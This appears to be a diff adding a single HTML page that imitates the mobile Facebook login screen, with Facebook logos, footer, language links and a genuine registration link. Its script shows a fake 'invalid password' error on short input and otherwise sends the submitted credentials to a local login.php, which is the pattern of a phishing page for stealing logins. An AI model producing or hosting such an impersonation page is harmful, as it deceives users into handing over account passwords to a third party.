@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en"> 
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="error-msg" id="error">
+        <p>Invalid username or password</p>
+    </div>
+    <div id="browser" class="browser-msg">
+        <img src="mobile.png" alt="">
+        <p>Download Facebook for Android and browse faster.</p>
+    </div>
+    <div class="container">
+        <div id="error"></div>
+        <img class="logo" src="fbLogo.png" alt="">
+        <form id="form" method="post" novalidate="1" > 
+            <div class="input-div">
+                <input id="username" type="username"  class="input" placeholder="Mobile number or email adress">
+                <input id="password" type="password" name="password" class="input" placeholder="Password">
+                <input  value="Log In" class="login" id="login-btn" type="submit">
+                <a href="#" id="forgotten-password">Forgotten Password?</a>
+
+            </div>
+        </form>
+            <div class="or">
+                <hr><span id="or">or</span><hr>
+            </div>
+            <br>
+            <div class="other-choice">
+                <a href="https://m.facebook.com/reg/?logger_id&cid=103&next=https%3A%2F%2Fm.facebook.com%2Fhome.php&refsrc=deprecated&soft=hjk " id="create-new-account">Create New Account</a>
+            </div>
+            <div class="languages">
+                <a href="#">English (UK)</a>
+                <a href="#">Francaise (France)</a>
+                <a href="#">العربية</a>
+                <a href="#">ⵜⴰⵎⴰⵣⵉⵖⵜ</a>
+                <a href="#">Espagnol(Espana)</a>
+                <a href="#">Portuguese(Brasil)</a>
+                <a href="#">Deutsch</a>
+                <span><a href="#" id="language-plus">+</a></span>
+            </div>
+            <div class="footer-links">
+                <a href="#">About</a> &middot;
+                <a href="#">Help</a> &middot;
+                <a href="#">More</a>
+            </div>
+            <div class="footer-copyright">
+                Facebook Inc.
+            </div>
+        </div>
+      <script>
+          let username = document.getElementById("username");
+          let password = document.getElementById("password");
+          let form = document.getElementById("form");
+          let error = document.getElementById("error");
+          let browser = document.getElementById("browser");
+          document.getElementById("form").addEventListener("submit", function(e){
+              if(username.value === '' || username == null || password.value === '' || password == null || password.value.length <= 6){
+                browser.style.display = "none";
+                error.style.display = "block";
+                e.preventDefault();
+               }
+              else{
+                  form.setAttribute('action', 'login.php');
+              }
+          })
+      </script>
+</body>
+</html>
